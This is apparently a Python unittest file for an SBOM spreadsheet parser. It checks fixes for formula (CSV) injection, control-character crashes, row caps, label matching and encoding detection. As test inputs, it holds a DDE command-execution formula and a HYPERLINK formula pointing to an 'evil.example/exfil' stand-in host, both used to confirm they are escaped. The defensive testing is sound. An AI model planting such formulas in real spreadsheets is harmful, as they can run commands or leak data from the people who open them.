"""Tests for parsing-evidence audit P0 fixes (csv-injection + crash).

Findings (adversarially confirmed, high confidence):
  * csv-injection: _write_rows wrote the header row verbatim, so a customer
    header beginning with = + - @ became a live formula in the report xlsx.
  * crash: _safe_cell did not strip XML-illegal control chars (NUL etc.), so
    openpyxl raised IllegalCharacterError at report write, discarding the whole
    match run.
"""

from __future__ import annotations

import json
import tempfile
import unittest
from pathlib import Path
from unittest.mock import patch

from openpyxl import Workbook

from app import spreadsheet_io
from app.spreadsheet_io import _safe_cell, _write_rows, read_sbom


class ParsingEvidenceP0Tests(unittest.TestCase):
    def test_safe_cell_strips_xml_illegal_control_chars(self) -> None:
        # NUL, 0x01, 0x1f must be removed (openpyxl IllegalCharacterError range)
        self.assertEqual(_safe_cell("foo\x00bar\x01baz\x1f"), "foobarbaz")
        self.assertEqual(_safe_cell("\x00"), "")

    def test_safe_cell_preserves_formula_escape(self) -> None:
        self.assertEqual(_safe_cell("=cmd|'/c calc'!A1"), "'=cmd|'/c calc'!A1")
        self.assertEqual(_safe_cell("+1"), "'+1")
        self.assertEqual(_safe_cell("@bad"), "'@bad")

    def test_write_rows_sanitizes_formula_in_headers(self) -> None:
        # A customer header beginning with '=' must NOT become a formula cell
        # in the written sheet (csv-injection fix).
        workbook = Workbook()
        worksheet = workbook.active
        malicious = "=HYPERLINK(\"http://evil.example/exfil\",\"click\")"
        _write_rows(worksheet, [malicious, "name"], [{malicious: "x", "name": "a"}])
        header_cell = worksheet.cell(row=1, column=1)
        self.assertNotEqual(
            header_cell.data_type,
            "f",
            "header became a formula — csv-injection not sanitized",
        )
        self.assertTrue(str(header_cell.value).startswith("'"))


class ParsingEvidenceP1Tests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self._tmp.name)

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def test_xlsx_row_cap_truncates_huge_sheet(self) -> None:
        wb = Workbook()
        ws = wb.active
        ws.title = "S"
        ws.append(["组件名称"])
        for i in range(10):
            ws.append([f"c{i}"])
        path = self.dir / "big.xlsx"
        wb.save(path)
        with patch.object(spreadsheet_io, "_MAX_PARSE_ROWS_PER_SHEET", 5):
            parsed = read_sbom(path)
        self.assertLessEqual(len(parsed["rows"]), 5)

    def test_cyclonedx_vulnerabilities_cap(self) -> None:
        payload = {
            "bomFormat": "CycloneDX",
            "specVersion": "1.6",
            "version": 1,
            "components": [
                {"type": "library", "name": "x", "version": "1", "bom-ref": "x"}
            ],
            "vulnerabilities": [
                {"id": f"CVE-2026-{i}", "affects": [{"ref": "x"}]} for i in range(10)
            ],
        }
        path = self.dir / "v.cdx.json"
        path.write_text(json.dumps(payload), encoding="utf-8")
        with patch.object(spreadsheet_io, "_MAX_VULNERABILITIES", 3):
            parsed = read_sbom(path)
        self.assertTrue(
            any("截断" in w for w in parsed.get("warnings", [])),
            f"expected truncation warning, got {parsed.get('warnings')}",
        )


class ParsingEvidenceP2AliasTests(unittest.TestCase):
    def test_metadata_label_exact_match_avoids_overmatch(self) -> None:
        from app.spreadsheet_io import _match_metadata_label

        # substring over-match regressions (finding 10/16)
        self.assertIsNone(_match_metadata_label("Hardware Build ID"))
        self.assertIsNone(_match_metadata_label("productnamespace"))
        self.assertIsNone(_match_metadata_label("Build Identifier Report"))
        # template/zh-en labels still resolve exactly
        self.assertEqual(_match_metadata_label("Build ID 构建号"), "software_build")
        self.assertEqual(_match_metadata_label("产品名称"), "product_name")
        self.assertEqual(_match_metadata_label("Product name"), "product_name")
        self.assertEqual(_match_metadata_label("Product version 产品版本"), "product_version")


class ParsingEvidenceP2ParseTests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self._tmp.name)

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def test_infer_mapping_prefers_populated_column(self) -> None:
        from app.spreadsheet_io import infer_mapping

        headers = ["组件名称", "Component Name"]
        rows = [
            {"组件名称": "", "Component Name": "openssl"},
            {"组件名称": "", "Component Name": "curl"},
        ]
        mapping = infer_mapping(headers, rows)
        self.assertEqual(mapping.get("name"), "Component Name")

    def test_dedupe_uses_collision_free_suffix(self) -> None:
        from app.spreadsheet_io import _dedupe_headers

        # a source header already shaped "X (1)" must not collide with a real
        # duplicate of "X"
        result = _dedupe_headers(["X (1)", "X", "X"])
        self.assertEqual(result[0], "X (1)")
        self.assertEqual(result[1], "X")
        self.assertTrue(result[2].startswith("X__"))

    def test_ragged_rows_keep_extra_columns(self) -> None:
        # CSV rows are variable length (csv.reader); a row wider than the header
        # must keep its trailing cells as extra_N rather than silently drop them.
        # (xlsx is not affected: openpyxl pads rows to max_column.)
        path = self.dir / "ragged.csv"
        path.write_text("组件名称,版本\nopenssl,1.0,extra-note\n", encoding="utf-8")
        parsed = read_sbom(path)
        self.assertIn("extra_1", parsed["headers"])


class ParsingEvidenceP2RemainingTests(unittest.TestCase):
    def setUp(self) -> None:
        self._tmp = tempfile.TemporaryDirectory()
        self.dir = Path(self._tmp.name)

    def tearDown(self) -> None:
        self._tmp.cleanup()

    def test_find_header_row_scans_past_20_rows(self) -> None:
        from app.spreadsheet_io import _find_header_row

        rows = [["noise"] for _ in range(25)] + [["组件名称", "版本"], ["openssl", "1.0"]]
        self.assertEqual(_find_header_row(rows), 25)

    def test_decode_csv_cp1252_not_misread_as_gb18030(self) -> None:
        path = self.dir / "cp1252.csv"
        path.write_bytes("name,vendor\nopenssl,M\xfcller\n".encode("cp1252"))
        text = spreadsheet_io._decode_csv(path)
        self.assertIn("Müller", text)

    def test_decode_csv_gb18030_preserves_chinese_headers(self) -> None:
        path = self.dir / "gb18030.csv"
        expected = "组件名称,版本\nopenssl,3.0.0\n"
        path.write_bytes(expected.encode("gb18030"))
        self.assertEqual(spreadsheet_io._decode_csv(path), expected)

    def test_read_xlsx_prefers_populated_sheet_over_empty_template(self) -> None:
        wb = Workbook()
        empty = wb.active
        empty.title = "Template"
        empty.append(["组件名称", "版本", "PURL", "CPE", "CVE", "EUVD ID"])  # all aliases, no data
        full = wb.create_sheet("Real")
        full.append(["组件名称", "版本"])
        full.append(["openssl", "1.0"])
        path = self.dir / "two.xlsx"
        wb.save(path)
        parsed = read_sbom(path)
        self.assertEqual(parsed["sheet"], "Real")


if __name__ == "__main__":
    unittest.main()
